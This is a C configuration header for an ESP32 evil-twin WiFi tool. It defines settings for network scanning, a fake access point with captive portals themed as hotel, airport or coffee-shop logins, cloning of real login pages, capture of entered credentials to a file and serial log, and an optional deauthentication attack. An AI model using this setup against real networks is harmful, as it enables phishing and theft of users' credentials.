#ifndef CONFIG_H
#define CONFIG_H

// ====== CONFIGURATION FILE ======

// Serial Monitor
#define SERIAL_BAUD 115200

// WiFi Scanner Settings
#define SCAN_INTERVAL 3000        // Time between scans (ms)
#define MAX_NETWORKS 30           // Maximum networks to display (increased)
#define SCAN_CHANNEL_TIME 120     // Time per channel in ms (faster = less AP disruption)
#define SCAN_TYPE_ACTIVE true     // Active scan (sends probe requests)
#define SCAN_SHOW_HIDDEN true     // Show hidden networks
#define MAX_SCAN_CYCLES 3        // Auto-quit after N scans (0 = infinite)

// Control AP Settings (ESP32's own WiFi for remote access)
#define CONTROL_AP_SSID "ESP32-Control"    // Your control AP name
#define CONTROL_AP_PASSWORD "12345678"     // Password (min 8 chars)
#define CONTROL_AP_CHANNEL 6               // Channel for control AP
#define CONTROL_AP_HIDDEN false            // Hide SSID?
#define CONTROL_AP_MAX_CONN 2              // Max connections

// WebSocket Server Settings (Secure remote access)
#define WEBSOCKET_PORT 81                  // WebSocket port
#define ENABLE_WEBSOCKET true              // Enable WebSocket server
#define WS_TIMEOUT 300000                  // Timeout after 5 min idle (ms)

// Target Network (will be selected from scan - no need to hardcode)
// You'll choose the target network interactively from the menu

// Captive Portal Settings
#define CAPTIVE_PORTAL_TIMEOUT 300000  // Auto-stop after 5 min (0 = never)
#define DEFAULT_PORTAL_TYPE PORTAL_GENERIC  // PORTAL_GENERIC, PORTAL_HOTEL, PORTAL_AIRPORT, PORTAL_COFFEE
#define EVIL_TWIN_CHANNEL 1       // WiFi channel (1-13)
#define MAX_CLIENTS 4             // Maximum connected clients
#define AP_HIDDEN false           // Hide SSID? (false = visible)

// Web Cloner Settings
#define CLONE_TIMEOUT 10000       // HTTP request timeout (ms)
#define MAX_HTML_SIZE 50000       // Maximum HTML size to download (bytes)
#define STRIP_EXTERNAL_RESOURCES true  // Remove external CSS/JS links

// Credential Storage
#define MAX_STORED_CREDS 50       // Maximum credentials to store in memory
#define LOG_TO_SERIAL true        // Print captured creds to serial

// Deauth Settings (Use responsibly!)
#define ENABLE_DEAUTH false       // Enable deauth functionality
#define DEAUTH_REASON 0x01        // Deauth reason code

// Feature Flags
#define ENABLE_WEB_CLONER true    // Enable portal cloning feature
#define ENABLE_SCANNER true       // Enable WiFi scanning
#define ENABLE_EVIL_TWIN true     // Enable evil twin AP
#define USE_GENERIC_PORTAL true   // Use generic login page as fallback

// Debug Settings
#define DEBUG_MODE true           // Enable verbose debugging
#define DEBUG_PACKET_INFO false   // Show packet details (very verbose)

// LED Indicator (optional - disable if no LED connected)
#define ENABLE_LED false          // Set to true only if you have LED
#define LED_PIN 2                 // Built-in LED on most ESP32 boards
#define LED_BLINK_SCAN 500        // Blink rate when scanning (ms)
#define LED_BLINK_CLONE 200       // Blink rate when cloning (ms)
#define LED_SOLID_AP true         // Solid LED when AP is running

// SPIFFS/LittleFS Paths
#define CLONED_HTML_PATH "/cloned/portal.html"
#define GENERIC_HTML_PATH "/index.html"
#define CREDENTIALS_LOG_PATH "/credentials.txt"

// Timing
#define STARTUP_DELAY 2000        // Delay before starting (ms)
#define MENU_TIMEOUT 30000        // Auto-start timeout (ms)

#endif // CONFIG_H